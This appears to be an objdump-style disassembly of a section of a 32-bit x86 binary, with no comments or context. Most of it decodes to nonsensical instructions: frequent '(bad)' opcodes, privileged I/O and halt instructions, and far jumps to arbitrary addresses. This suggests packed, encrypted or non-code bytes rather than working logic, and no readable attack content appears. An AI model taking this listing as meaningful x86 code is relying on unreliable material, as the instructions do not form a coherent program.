  41efe8:	jmp    0x41ef96
  41efea:	mov    dh,0x1d
  41efec:	or     BYTE PTR [edi-0x2b],0xcc
  41eff0:	fnstenv [eax+0x3ec9a58e]
  41eff6:	mov    ds:0x1747e232,al
  41effb:	imul   eax,ecx,0x16636356
  41f001:	(bad)  
  41f002:	arpl   WORD PTR [edi+0x52],ax
  41f005:	mov    eax,ds:0x3259cc4e
  41f00a:	xchg   dx,ax
  41f00c:	sbb    al,0x7a
  41f00e:	mov    ah,0x0
  41f010:	xchg   DWORD PTR [ebp+0x5a856471],eax
  41f016:	scas   al,BYTE PTR es:[edi]
  41f017:	into   
  41f018:	jmp    0xdcc20992
  41f01d:	div    BYTE PTR [edi-0x53]
  41f020:	gs dec ebp
  41f022:	mov    ss,WORD PTR [eax]
  41f024:	add    al,0x8c
  41f026:	xor    eax,0x1478185
  41f02b:	pop    esp
  41f02c:	pop    ds
  41f02d:	in     eax,dx
  41f02e:	mov    dl,0x26
  41f030:	xchg   edx,eax
  41f031:	nop
  41f032:	jp     0x41f011
  41f034:	xchg   esi,eax
  41f035:	sub    edi,ecx
  41f037:	das    
  41f038:	out    0xd3,eax
  41f03a:	mov    ecx,0xc12f23c9
  41f03f:	push   0xab42ac9d
  41f044:	dec    edi
  41f045:	mov    WORD PTR [edx-0x4867b16c],ss
  41f04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f04c:	lahf   
  41f04d:	jg     0x41f0a4
  41f04f:	inc    edx
  41f050:	popa   
  41f051:	(bad)  
  41f053:	xchg   DWORD PTR [ecx+0x50],ecx
  41f056:	and    edx,0x85fe8e1
  41f05c:	xchg   BYTE PTR [ebx+ebp*1+0x6189d1ed],cl
  41f063:	or     eax,0x5379f6fb
  41f068:	sub    DWORD PTR [edi-0x1a849521],esi
  41f06e:	stos   DWORD PTR es:[edi],eax
  41f06f:	pop    ss
  41f070:	jno    0x41f03f
  41f072:	mov    es,WORD PTR [ebp-0x4b]
  41f075:	out    dx,al
  41f076:	pop    edi
  41f077:	mov    esp,0x22b4086c
  41f07c:	ja     0x41f02a
  41f07e:	fisub  WORD PTR [eax]
  41f080:	xchg   ebx,eax
  41f081:	xor    ebx,DWORD PTR [esi+0x2c]
  41f084:	mov    edi,0xc67fc414
  41f089:	and    bh,BYTE PTR [esi-0x6f]
  41f08c:	hlt    
  41f08d:	xlat   BYTE PTR ds:[ebx]
  41f08e:	daa    
  41f08f:	cld    
  41f090:	test   DWORD PTR [esi-0x92b5c29],0x8dde7295
  41f09a:	cmp    ebp,DWORD PTR [edx-0x60]
  41f09d:	push   0x8eda15dd
  41f0a2:	mov    ds:0x2dadbca5,eax
  41f0a7:	mov    ah,0xb5
  41f0a9:	dec    esi
  41f0aa:	cmp    eax,0x15866a86
  41f0af:	inc    esi
  41f0b0:	pop    ss
  41f0b1:	inc    edi
  41f0b2:	mov    WORD PTR [ebx-0x6dd21e69],fs
  41f0b8:	sti    
  41f0b9:	mov    cl,0x31
  41f0bb:	xchg   BYTE PTR [esi-0x75837d50],dh
  41f0c1:	shl    DWORD PTR [ecx-0x5730ee72],1
  41f0c7:	pop    es
  41f0c8:	ror    BYTE PTR [ecx],0x18
  41f0cb:	cmp    cl,0x7a
  41f0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cf:	mov    bh,0xb4
  41f0d1:	daa    
  41f0d2:	jnp    0x41f075
  41f0d4:	int    0xda
  41f0d6:	cmp    ah,BYTE PTR [eax-0xba06f27]
  41f0dc:	hlt    
  41f0dd:	add    esi,DWORD PTR [ecx]
  41f0df:	or     ecx,DWORD PTR [eax+0x33]
  41f0e2:	ins    BYTE PTR es:[edi],dx
  41f0e3:	pop    es
  41f0e4:	and    al,bh
  41f0e6:	outs   dx,DWORD PTR ds:[esi]
  41f0e7:	mov    eax,ds:0xf04cd6ba
  41f0ec:	ins    BYTE PTR es:[edi],dx
  41f0ed:	fdiv   QWORD PTR [edx-0x441714]
  41f0f3:	daa    
  41f0f4:	stos   BYTE PTR es:[edi],al
  41f0f5:	jne    0x41f147
  41f0f7:	push   cs
  41f0f8:	inc    ah
  41f0fa:	sti    
  41f0fb:	jp     0x41f0b9
  41f0fd:	inc    ecx
  41f0fe:	inc    esp
  41f0ff:	lahf   
  41f100:	xchg   ebx,eax
  41f101:	dec    eax
  41f102:	inc    edi
  41f103:	or     al,0x9e
  41f105:	mov    ebx,0x1b319c2c
  41f10a:	(bad)  
  41f10b:	mov    ebp,0x20e312fa
  41f110:	xor    eax,0x4c0f8f6b
  41f115:	cmp    DWORD PTR [esi+0x5f8373b7],0xffffffd8
  41f11c:	xlat   BYTE PTR ds:[ebx]
  41f11d:	mov    ebp,0xe1aa281d
  41f122:	fcmove st,st(4)
  41f124:	leave  
  41f125:	je     0x41f0ef
  41f127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f128:	ins    BYTE PTR es:[edi],dx
  41f129:	test   al,0xc1
  41f12b:	or     al,0x1b
  41f12d:	fidiv  WORD PTR [edx]
  41f12f:	xor    ch,BYTE PTR [edi+0x11]
  41f132:	sub    eax,0xbc4f3c9a
  41f137:	push   cs
  41f138:	or     al,0x77
  41f13a:	in     al,dx
  41f13b:	retw   
  41f13d:	aad    0xb1
  41f13f:	fbstp  TBYTE PTR [edx+0x1a]
  41f142:	or     al,0xa7
  41f144:	dec    esp
  41f145:	push   ds
  41f146:	xchg   edx,eax
  41f147:	sbb    DWORD PTR [edi+0x55da9111],ecx
  41f14d:	sbb    eax,0x737a15e8
  41f152:	das    
  41f153:	cmp    DWORD PTR [ecx],0x70
  41f156:	jnp    0x41f1b8
  41f158:	shr    DWORD PTR [edi+0xf],1
  41f15b:	sub    cl,al
  41f15d:	mov    ds:0x7116bba1,al
  41f162:	(bad)  
  41f163:	outs   dx,DWORD PTR ds:[esi]
  41f164:	aad    0x7b
  41f166:	dec    ecx
  41f167:	popa   
  41f168:	outs   dx,BYTE PTR ds:[esi]
  41f169:	jno    0x41f10d
  41f16b:	xor    eax,DWORD PTR [esi]
  41f16d:	es (bad) 
  41f16f:	hlt    
  41f170:	push   ss
  41f171:	ja     0x41f0f9
  41f173:	(bad)  
  41f174:	daa    
  41f175:	test   BYTE PTR [esi+0x36ca43e3],0x59
  41f17c:	adc    ebx,DWORD PTR [ebx+ebx*2]
  41f17f:	pushf  
  41f180:	add    cl,BYTE PTR [eax+0x1f540467]
  41f186:	mov    ebp,0xbfce21fb
  41f18b:	mov    edx,0x609417ac
  41f190:	and    al,0xea
  41f192:	ins    DWORD PTR es:[edi],dx
  41f193:	sar    al,cl
  41f195:	ds scas eax,DWORD PTR es:[edi]
  41f197:	inc    ecx
  41f198:	adc    bh,BYTE PTR [edx]
  41f19a:	iret   
  41f19b:	cld    
  41f19c:	mov    ch,cl
  41f19e:	fisubr DWORD PTR [edx+0x36b16577]
  41f1a4:	loop   0x41f1ee
  41f1a6:	es mov bl,0xd
  41f1a9:	xor    DWORD PTR [ebx],ebx
  41f1ab:	mov    eax,0x3ed19696
  41f1b0:	add    dh,0x6f
  41f1b3:	cmp    eax,0x604f419a
  41f1b8:	das    
  41f1b9:	pop    ss
  41f1ba:	jecxz  0x41f1e8
  41f1bc:	call   0xbf31ef49
  41f1c1:	bound  esp,QWORD PTR [ecx+edi*8-0x77fc657b]
  41f1c8:	enter  0x9312,0x2e
  41f1cc:	dec    edx
  41f1cd:	inc    esp
  41f1ce:	das    
  41f1cf:	sbb    esi,eax
  41f1d1:	mov    cl,0x53
  41f1d3:	fs rcl al,cl
  41f1d6:	shl    DWORD PTR [edi-0x27],cl
  41f1d9:	xor    BYTE PTR cs:[ebx-0x3221e004],bl
  41f1e0:	cli    
  41f1e1:	and    eax,DWORD PTR [edi+0x3a]
  41f1e4:	icebp  
  41f1e5:	xor    ecx,DWORD PTR [edx]
  41f1e7:	je     0x41f1fe
  41f1e9:	push   eax
  41f1ea:	sub    eax,0x7a960b24
  41f1ef:	xlat   BYTE PTR ds:[ebx]
  41f1f0:	(bad)  
  41f1f2:	jmp    0xa911:0x3b9220ae
  41f1f9:	mov    ecx,0xc5cceaa1
  41f1fe:	add    al,0x34
  41f200:	cmp    DWORD PTR [edx+0x74],ebx
  41f203:	push   0xed89184
  41f208:	test   esi,esp
  41f20a:	je     0x41f1ab
  41f20c:	xchg   di,ax
  41f20e:	lods   eax,DWORD PTR ds:[esi]
  41f20f:	dec    ebx
  41f210:	es jbe 0x41f21a
  41f213:	mov    al,ds:0x197e5d62
  41f218:	(bad)  
  41f219:	nop
  41f21a:	dec    edi
  41f21b:	test   BYTE PTR [esi+0x32],bh
  41f21e:	test   DWORD PTR [edx-0x8],edx
  41f221:	repz jl 0x41f2a3
  41f224:	xchg   DWORD PTR cs:[esi],edi
  41f227:	lahf   
  41f228:	mov    bh,bl
  41f22a:	test   DWORD PTR [esi+edi*4],ecx
  41f22d:	mov    eax,ds:0x986c4863
  41f232:	pop    ss
  41f233:	pop    esi
  41f234:	hlt    
  41f235:	into   
  41f236:	clc    
  41f237:	add    DWORD PTR [edi+0x4],ebp
  41f23a:	and    al,0x98
  41f23c:	pop    eax
  41f23d:	mov    dl,0x56
  41f23f:	retf   
  41f240:	add    al,0xde
  41f242:	mov    ds:0xb7f48fe5,al
  41f247:	adc    DWORD PTR [ebp-0x47dc1528],edi
  41f24d:	lods   eax,DWORD PTR ds:[esi]
  41f24e:	mov    ebx,0x40d25f65
  41f253:	and    BYTE PTR [edx*8+0x7af287ba],dh
  41f25a:	and    BYTE PTR [edi],dl
  41f25c:	or     BYTE PTR ds:[edi-0x18],al
  41f260:	inc    eax
  41f261:	arpl   WORD PTR [edi+eiz*8],di
  41f264:	add    ebp,DWORD PTR [edi]
  41f266:	jne    0x41f2ac
  41f268:	lds    ebp,FWORD PTR [ecx]
  41f26a:	rol    BYTE PTR [ecx-0x764c9faf],0xfb
  41f271:	popf   
  41f272:	xchg   edi,eax
  41f273:	(bad)  
  41f274:	(bad)  [edx+ebx*4+0x3d]
  41f278:	inc    eax
  41f279:	(bad)  
  41f27a:	pop    esp
  41f27b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f27c:	push   0xffffffd7
  41f27e:	(bad)  
  41f280:	loop   0x41f231
  41f282:	cmp    BYTE PTR [ecx],cl
  41f284:	push   ebx
  41f285:	arpl   WORD PTR [ecx-0x71],dx
  41f288:	inc    ebp
  41f289:	xor    ebx,edi
  41f28b:	add    ch,BYTE PTR [ebx+0x1b]
  41f28e:	inc    esp
  41f28f:	out    0x64,al
  41f291:	jno    0x41f2f5
  41f293:	push   edi
  41f294:	popa   
  41f295:	loope  0x41f28f
  41f297:	jo     0x41f2d6
  41f299:	shl    esp,0x30
  41f29c:	inc    ebp
  41f29d:	aad    0xba
  41f29f:	dec    esi
  41f2a0:	jno    0x41f2e6
  41f2a2:	mov    eax,0x48c059a3
  41f2a7:	mov    ah,cl
  41f2a9:	retf   0xf331
  41f2ac:	push   edx
  41f2ad:	xor    cl,ah
  41f2af:	inc    esi
  41f2b0:	push   ebp
  41f2b1:	test   al,0x31
  41f2b3:	jp     0x41f263
  41f2b5:	mov    cl,BYTE PTR [esi-0x430aa537]
  41f2bb:	push   ebp
  41f2bc:	cmp    dh,BYTE PTR [esi+0x63]
  41f2bf:	pop    esi
  41f2c0:	pop    ecx
  41f2c1:	jno    0x41f29c
  41f2c3:	les    ecx,FWORD PTR [esi+0x5c]
  41f2c6:	mov    cl,0x12
  41f2c8:	fdiv   st(4),st
  41f2ca:	fstp   TBYTE PTR [ecx+0x29cc236]
  41f2d0:	and    cl,BYTE PTR [ebp-0x4f]
  41f2d3:	(bad)  
  41f2d5:	sti    
  41f2d6:	in     eax,dx
  41f2d7:	pusha  
  41f2d8:	fisttp WORD PTR [ebp+0x5a]
  41f2db:	pop    ebp
  41f2dc:	ror    DWORD PTR [ebp+eax*2+0x7b],0x37
  41f2e1:	inc    eax
  41f2e2:	push   edi
  41f2e3:	xor    bl,ch
  41f2e5:	pop    esp
  41f2e6:	cdq    
  41f2e7:	in     eax,dx
  41f2e8:	(bad)  
  41f2e9:	jmp    0x19ab:0x9abe1ee0
  41f2f0:	ins    BYTE PTR es:[edi],dx
  41f2f1:	icebp  
  41f2f2:	ins    DWORD PTR es:[edi],dx
  41f2f3:	sti    
  41f2f4:	pop    ss
  41f2f5:	fisub  WORD PTR ds:0x86adc657
  41f2fb:	pop    es
  41f2fc:	inc    esi
  41f2fd:	aam    0x3c
  41f2ff:	sbb    edx,DWORD PTR [edi]
  41f301:	cmp    al,0x4f
  41f303:	add    BYTE PTR [ebp-0xd],0x64
  41f307:	into   
  41f308:	jne    0x41f2bc
  41f30a:	and    bl,0xb4
  41f30d:	jle    0x41f34c
  41f30f:	push   esi
  41f310:	push   eax
  41f311:	adc    DWORD PTR [edi-0x7a],0xffffffd9
  41f315:	push   ecx
  41f316:	dec    esi
  41f317:	push   edi
  41f318:	push   eax
  41f319:	call   0x38cc1c34
  41f31e:	jp     0x41f388
  41f320:	(bad)  
  41f321:	and    dl,ch
  41f323:	xchg   DWORD PTR [ebx+0x31c8c275],ebp
  41f329:	scas   eax,DWORD PTR es:[edi]
  41f32a:	xor    ah,BYTE PTR [esi+esi*8+0x2e]
  41f32e:	cmp    al,0x8a
  41f330:	pop    esi
  41f331:	xchg   ebp,eax
  41f332:	gs push ebp
  41f334:	lods   al,BYTE PTR ds:[esi]
  41f335:	enter  0x89ac,0x68
  41f339:	(bad)  
  41f33b:	inc    ebx
  41f33c:	in     eax,dx
  41f33d:	stos   BYTE PTR es:[edi],al
  41f33e:	inc    ecx
  41f33f:	out    dx,al
  41f340:	dec    esi
  41f341:	push   edi
  41f342:	or     BYTE PTR [eax],cl
  41f344:	shr    DWORD PTR [edi],0x11
  41f347:	xchg   esp,eax
  41f348:	fiadd  WORD PTR [edi-0x48157854]
  41f34e:	retf   
  41f34f:	and    DWORD PTR [edx-0x72],edi
  41f352:	into   
  41f353:	mov    dh,0x98
  41f355:	imul   esi,DWORD PTR [edx+edi*2+0x363a6a48],0x4213f00
  41f360:	pop    ebp
  41f361:	cld    
  41f362:	mov    cl,0xfc
  41f364:	add    eax,DWORD PTR [ebx-0x19ceb371]
  41f36a:	push   edi
  41f36b:	pop    esi
  41f36c:	dec    eax
  41f36d:	arpl   ax,bp
  41f36f:	jge    0x41f3b0
  41f371:	retf   0xb4da
  41f374:	test   eax,0xd7db657a
  41f379:	mov    bl,0x7f
  41f37b:	mov    DWORD PTR [edx-0x22b6068d],ecx
  41f381:	xor    al,0x9c
  41f383:	mov    al,0x3
  41f385:	xor    BYTE PTR [ebx+eax*1-0x56],dl
  41f389:	inc    ebp
  41f38a:	mov    ?,WORD PTR ss:[edi-0x48]
  41f38e:	mov    cl,0x7f
  41f390:	jb     0x41f32a
  41f392:	xchg   edi,eax
  41f393:	sub    edi,0xffffffd7
  41f396:	lea    edi,[edx+0x2]
  41f399:	inc    ecx
  41f39a:	bound  edi,QWORD PTR [esi]
  41f39c:	push   esp
  41f39d:	xchg   BYTE PTR [ebp+0x56],al
  41f3a0:	cmp    al,0xeb
  41f3a2:	in     al,0x83
  41f3a4:	and    DWORD PTR [ebp-0x30],esp
  41f3a7:	bound  ecx,QWORD PTR [esi]
  41f3a9:	cmp    DWORD PTR [edi-0x13],edx
  41f3ac:	ss int3 
  41f3ae:	mul    DWORD PTR [esi]
  41f3b0:	sbb    BYTE PTR [ecx],ch
  41f3b2:	pop    ecx
  41f3b3:	mov    WORD PTR [eax+ebp*8+0x5a],es
  41f3b7:	jecxz  0x41f3c9
  41f3b9:	mov    dl,0xd8
  41f3bb:	add    ebp,edx
  41f3bd:	daa    
  41f3be:	cmp    eax,0xfada4173
  41f3c3:	sbb    BYTE PTR [edx+esi*8],0xd8
  41f3c7:	mov    al,0x15
  41f3c9:	gs dec ecx
  41f3cb:	pop    ss
  41f3cc:	cmp    dh,BYTE PTR [ebp+0x51]
  41f3cf:	add    esi,DWORD PTR ds:0x2258a34c
  41f3d5:	inc    ebp
  41f3d6:	push   cs
  41f3d7:	mov    ebx,0x7ca0c4e0
  41f3dc:	jecxz  0x41f372
  41f3de:	jg     0x41f422
  41f3e0:	ret    
  41f3e1:	sub    cl,dh
  41f3e3:	jne    0x41f375
  41f3e5:	pop    ecx
  41f3e6:	in     al,dx
  41f3e7:	mov    eax,ds:0x560e7265
  41f3ec:	dec    eax
  41f3ed:	mov    al,0x21
  41f3ef:	imul   eax,DWORD PTR [edi+0x27],0xca856b82
  41f3f6:	into   
  41f3f7:	jecxz  0x41f37d
  41f3f9:	xlat   BYTE PTR ds:[ebx]
  41f3fa:	sub    ebx,DWORD PTR [esi-0x5dc35ecf]
  41f400:	fidivr WORD PTR [ebp+0x56]
  41f403:	xor    ah,BYTE PTR [ecx+0x74]
  41f406:	jle    0x41f439
  41f408:	inc    edx
  41f409:	inc    eax
  41f40a:	mov    esp,0xab6f981
  41f40f:	iret   
  41f410:	test   DWORD PTR [edi-0x44],ecx
  41f413:	clc    
  41f414:	push   0xec09c22c
  41f419:	push   ebx
  41f41a:	mov    WORD PTR [esi-0x6c],?
  41f41d:	add    esp,edx
  41f41f:	mov    ebp,0x4e4bd68e
  41f424:	les    esi,FWORD PTR [edi+0x2a]
  41f427:	sub    dl,BYTE PTR [ecx+ebp*1+0x40]
  41f42b:	or     eax,0x3e24beb1
  41f431:	and    ah,BYTE PTR [edx+0x3b4181f1]
  41f437:	adc    DWORD PTR [eax-0x758728bd],edi
  41f43d:	out    0xd,eax
  41f43f:	dec    eax
  41f440:	push   esi
  41f441:	sbb    al,BYTE PTR [edi-0x25]
  41f444:	fst    QWORD PTR [ebp+ebp*2-0x7]
  41f448:	mov    esi,0xd04ac414
  41f44d:	call   DWORD PTR [eax]
  41f44f:	push   edi
  41f450:	cs ins DWORD PTR es:[edi],dx
  41f452:	lods   eax,DWORD PTR ds:[esi]
  41f453:	pop    ebx
  41f454:	add    BYTE PTR [ebx-0x29],dl
  41f457:	leave  
  41f458:	dec    ebx
  41f459:	push   0x80e35784
  41f45e:	jae    0x41f4d5
  41f460:	test   al,0xae
  41f462:	out    0xb1,al
  41f464:	loope  0x41f4dc
  41f466:	pop    esi
  41f467:	pop    edx
  41f468:	fdivr  st,st(0)
  41f46a:	xor    eax,0x9e700e5
  41f46f:	pop    esi
  41f470:	push   edi
  41f471:	pop    ds
  41f472:	stos   DWORD PTR es:[edi],eax
  41f473:	ds out 0x42,al
  41f476:	push   esi
  41f477:	shl    bl,0xf3
  41f47a:	adc    ecx,esp
  41f47c:	mov    cl,BYTE PTR [ecx+0x4a]
  41f47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f480:	sbb    BYTE PTR ds:0x1b4f8253,ch
  41f486:	jnp    0x41f4fb
  41f488:	xchg   DWORD PTR ds:0xafc2a08f,ebx
  41f48e:	aas    
  41f48f:	pushf  
  41f490:	jbe    0x41f461
  41f492:	icebp  
  41f493:	mov    esi,0x7f33ae06
  41f498:	or     BYTE PTR [edx-0x11],al
  41f49b:	pop    es
  41f49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49e:	mov    ch,0x27
  41f4a0:	(bad)  
  41f4a1:	std    
  41f4a2:	nop
  41f4a3:	push   0xffffffe0
  41f4a5:	and    dl,BYTE PTR [esi-0x39]
  41f4a8:	xor    eax,0x46c1614f
  41f4ad:	pushf  
  41f4ae:	xchg   ebp,eax
  41f4af:	push   esp
  41f4b0:	jecxz  0x41f4a4
  41f4b2:	mov    ds:0x29b3d71c,eax
  41f4b7:	shr    dh,cl
  41f4b9:	shl    eax,0xb6
  41f4bc:	ror    BYTE PTR ds:0x6b41586b,0xc4
  41f4c3:	dec    ebx
  41f4c4:	retf   
  41f4c5:	cli    
  41f4c6:	dec    edx
  41f4c7:	inc    ecx
  41f4c9:	jmp    0x7bf0:0xb5ac59ef
  41f4d0:	enter  0x8a58,0x62
  41f4d4:	pop    ecx
  41f4d5:	aas    
  41f4d6:	(bad)  
  41f4d7:	mov    ebp,esi
  41f4d9:	inc    ecx
  41f4da:	dec    ebx
  41f4db:	pop    edx
  41f4dc:	xor    al,0xd4
  41f4de:	jecxz  0x41f49f
  41f4e0:	mov    bh,0xe2
  41f4e2:	sbb    eax,0x47ae667c
  41f4e7:	sbb    ebp,edi
  41f4e9:	or     al,bl
  41f4eb:	xchg   esp,eax
  41f4ec:	popa   
  41f4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ee:	cld    
  41f4ef:	pop    esi
  41f4f0:	cs daa 
  41f4f2:	test   edi,0xb630cb0e
  41f4f8:	inc    esi
  41f4f9:	aad    0xb9
  41f4fb:	ins    DWORD PTR es:[edi],dx
  41f4fc:	pusha  
  41f4fd:	jge    0x41f49f
  41f4ff:	push   0x2772d37f
  41f504:	xor    eax,0x7842da22
  41f509:	call   0x559cb167
  41f50e:	lahf   
  41f50f:	adc    dh,ah
  41f511:	add    eax,0x948eaf55
  41f516:	fdivr  DWORD PTR [edi-0x3e]
  41f519:	std    
  41f51a:	inc    edx
  41f51b:	popa   
  41f51c:	push   eax
  41f51d:	jp     0x41f4d1
  41f51f:	rol    cl,0x29
  41f522:	push   edi
  41f523:	mov    eax,0xafa39858
  41f528:	jne    0x41f4fa
  41f52a:	xchg   DWORD PTR [ebx+0x628eb6db],esp
  41f530:	adc    DWORD PTR [ebx+0x9],esi
  41f533:	push   ss
  41f534:	add    al,bl
  41f536:	push   esp
  41f537:	adc    DWORD PTR [ecx],0x5d
  41f53a:	push   esp
  41f53b:	rol    BYTE PTR [eax+0x79bf1d7d],0xfb
  41f542:	and    DWORD PTR [edi-0x4f8075ca],esi
  41f548:	mov    DWORD PTR [edx-0x4485233a],esp
  41f54e:	push   ds
  41f54f:	in     eax,0x84
  41f551:	aad    0x75
  41f553:	xchg   edi,eax
  41f554:	jmp    0xc46ffc15
  41f559:	xor    dl,ch
  41f55b:	stos   BYTE PTR es:[edi],al
  41f55c:	addr16 aad 0xcb
  41f55f:	adc    al,BYTE PTR [esi]
  41f561:	jb     0x41f561
  41f563:	aad    0x83
  41f565:	inc    eax
  41f566:	sub    ah,BYTE PTR [ebp+0x2710e042]
  41f56c:	jmp    0x97b59446
  41f571:	clc    
  41f572:	sub    al,0x76
  41f574:	xchg   ebx,eax
  41f575:	scas   al,BYTE PTR es:[edi]
  41f576:	pop    ecx
  41f577:	fcmovu st,st(4)
  41f579:	xchg   WORD PTR [edi],di
  41f57c:	inc    eax
  41f57d:	arpl   bp,bx
  41f57f:	xlat   BYTE PTR ds:[ebx]
  41f580:	andps  xmm4,XMMWORD PTR [edi-0x4b6b45ac]
  41f587:	test   BYTE PTR [ecx+0x61],ch
  41f58a:	adc    ah,BYTE PTR [esi+0x6f9e9c08]
  41f590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f591:	sbb    edx,DWORD PTR [ebp-0xe]
  41f594:	mov    al,0xa9
  41f596:	push   0x4f
  41f598:	test   eax,0xa6228bdd
  41f59d:	sahf   
  41f59e:	xor    cl,BYTE PTR [ebx+0x78058e82]
  41f5a4:	sbb    BYTE PTR [ecx+0xb880df5],bl
  41f5aa:	test   DWORD PTR [ebx],eax
  41f5ac:	push   ds
  41f5ad:	and    DWORD PTR [ecx-0x7e],ecx
  41f5b0:	nop
  41f5b1:	mov    dh,0xd
  41f5b3:	outs   dx,DWORD PTR ds:[esi]
  41f5b4:	xor    BYTE PTR [ebp-0x22e1bc4e],0x83
  41f5bb:	scas   al,BYTE PTR es:[edi]
  41f5bc:	add    eax,0xd91aa7fb
  41f5c1:	mov    ds:0x221593ed,eax
  41f5c6:	daa    
  41f5c7:	repz jmp 0x41f61e
  41f5ca:	pop    es
  41f5cb:	test   bh,0x53
  41f5ce:	and    DWORD PTR [edi+0x33],0xffffffd4
  41f5d2:	cs aam 0xda
  41f5d5:	lods   eax,DWORD PTR ds:[esi]
  41f5d6:	(bad)  
  41f5d7:	mov    dh,BYTE PTR [esi+0x50df769e]
  41f5dd:	pop    edi
  41f5de:	test   BYTE PTR [edi-0x756e0ef7],dl
  41f5e4:	test   al,0xb8
  41f5e6:	dec    BYTE PTR [esi+0x2dacedc3]
  41f5ec:	inc    ecx
  41f5ed:	icebp  
  41f5ee:	ja     0x41f5df
  41f5f0:	inc    ecx
  41f5f1:	inc    ecx
  41f5f2:	addr16 xchg ebx,eax
  41f5f4:	pop    esi
  41f5f5:	mov    dl,BYTE PTR [edi-0x51]
  41f5f8:	sub    eax,0xe8d995d8
  41f5fd:	jo     0x41f5dd
  41f5ff:	push   ss
  41f600:	xchg   ebx,eax
  41f601:	xchg   bl,bh
  41f603:	sbb    BYTE PTR [esi-0x3a19dea5],al
  41f609:	sub    eax,0x561c5dcc
  41f60e:	jg     0x41f5f6
  41f610:	data16 rcl BYTE PTR [edi],cl
  41f613:	(bad)  [esi]
  41f615:	adc    al,0x34
  41f617:	retf   0x850b
  41f61a:	sub    BYTE PTR [edx+0x1f413737],cl
  41f620:	mov    ah,0xa6
  41f622:	(bad)  
  41f623:	mov    al,ds:0xe265cc9
  41f628:	mov    ebx,0x7fe5ea78
  41f62d:	(bad)  
  41f62e:	push   ebp
  41f62f:	or     eax,0x8ffe8256
  41f634:	fdivr  QWORD PTR [edx]
  41f636:	jmp    0x4723:0x3e048dac
  41f63d:	xchg   BYTE PTR [ebx-0x601a49f9],al
  41f643:	xchg   esi,edx
  41f645:	les    esp,FWORD PTR [ebx+0xd00dd48]
  41f64b:	fld    QWORD PTR [ecx-0x7ef42940]
  41f651:	dec    esp
  41f652:	xchg   edx,eax
  41f653:	xor    DWORD PTR [ebx+0x1d],esp
  41f656:	inc    eax
  41f657:	or     esp,DWORD PTR [eax+ecx*8+0x0]
  41f65b:	push   eax
  41f65c:	shl    BYTE PTR [edi-0x532a8202],0x88
  41f663:	adc    ecx,DWORD PTR [esi-0x2a]
  41f666:	in     al,dx
  41f667:	dec    esp
  41f668:	add    DWORD PTR [edi+ebp*8-0x23a468aa],edx
  41f66f:	mov    eax,DWORD PTR [eax]
  41f671:	adc    edx,DWORD PTR [edi-0x3d47fb44]
  41f677:	cwd    
  41f679:	out    dx,al
  41f67a:	or     BYTE PTR [eax+0x3c],cl
  41f67d:	mov    ds:0xf797c1ba,eax
  41f682:	push   es
  41f683:	es leave 
  41f685:	push   eax
  41f686:	sub    ebp,edx
  41f688:	inc    ecx
  41f689:	xchg   esi,eax
  41f68a:	dec    eax
  41f68b:	push   edi
  41f68c:	mov    ds:0x4a9166c,al
  41f691:	iret   
  41f692:	pop    ebp
  41f693:	push   ebp
  41f694:	mov    eax,ds:0x83332640
  41f699:	pushf  
  41f69a:	push   ds
  41f69b:	mov    bl,0x1f
  41f69d:	add    eax,0x5f004752
  41f6a2:	ds pusha 
  41f6a4:	pop    ebp
  41f6a5:	mov    esp,0x91a00aa8
  41f6aa:	clc    
  41f6ab:	sbb    al,0xef
  41f6ad:	xchg   ecx,eax
  41f6ae:	cli    
  41f6af:	xchg   ebx,eax
  41f6b0:	or     esp,DWORD PTR [edi-0x71a54e2c]
  41f6b6:	mov    dl,0x20
  41f6b8:	nop
  41f6b9:	sub    edx,eax
  41f6bb:	jecxz  0x41f675
  41f6bd:	pop    esi
  41f6be:	pusha  
  41f6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c0:	sbb    ecx,DWORD PTR [edx]
  41f6c2:	arpl   WORD PTR [edx+esi*1+0x10],ax
  41f6c6:	lods   eax,DWORD PTR ds:[esi]
  41f6c7:	mov    edx,0xe354af9a
  41f6cc:	stc    
  41f6cd:	jl     0x41f6c4
  41f6cf:	iret   
  41f6d0:	(bad)  
  41f6d1:	loopne 0x41f655
  41f6d3:	push   ds
  41f6d4:	cmp    DWORD PTR [ebx-0x45],ebp
  41f6d7:	ins    DWORD PTR es:[edi],dx
  41f6d8:	out    dx,eax
  41f6d9:	not    DWORD PTR ss:[esi-0x6d]
  41f6dd:	ja     0xa8f559fb
  41f6e3:	inc    esi
  41f6e4:	rol    BYTE PTR ds:0x977f9b0a,0x7a
  41f6eb:	sbb    al,0x14
  41f6ed:	inc    esi
  41f6ee:	test   al,0x91
  41f6f0:	sub    cl,BYTE PTR [ecx-0x55eda547]
  41f6f6:	mov    bl,0x9b
  41f6f8:	cmp    DWORD PTR [edx+0x1d],esp
  41f6fb:	cli    
  41f6fc:	ror    DWORD PTR [ecx-0x69],1
  41f6ff:	in     eax,0x9f
  41f701:	mov    ds:0x3e7ad3ea,eax
  41f706:	xor    al,0xc8
  41f708:	pop    edx
  41f709:	mov    WORD PTR [edi],ss
  41f70b:	stc    
  41f70c:	(bad)  
  41f70d:	popa   
  41f70e:	dec    ebp
  41f70f:	pop    ebp
  41f710:	dec    eax
  41f711:	add    DWORD PTR [ebx],ecx
  41f713:	cwde   
  41f714:	pop    edx
  41f715:	popa   
  41f716:	jae    0x41f6e0
  41f718:	jno    0x41f780
  41f71a:	jmp    0x41f6f8
  41f71c:	popa   
  41f71d:	push   ebx
  41f71e:	bnd jo 0x41f733
  41f721:	sub    al,0xd
  41f723:	bound  edi,QWORD PTR [eax+0x64]
  41f726:	ins    BYTE PTR es:[edi],dx
  41f727:	add    al,0xef
  41f729:	cmp    DWORD PTR ds:0xd6f17218,ecx
  41f72f:	mov    ds:0x23af177,al
  41f734:	arpl   WORD PTR [eax],ax
  41f736:	sbb    dh,BYTE PTR [edi+0x3e0b8098]
  41f73c:	(bad)  [esi]
  41f73e:	dec    edx
  41f73f:	fcomp  DWORD PTR [ecx-0xa]
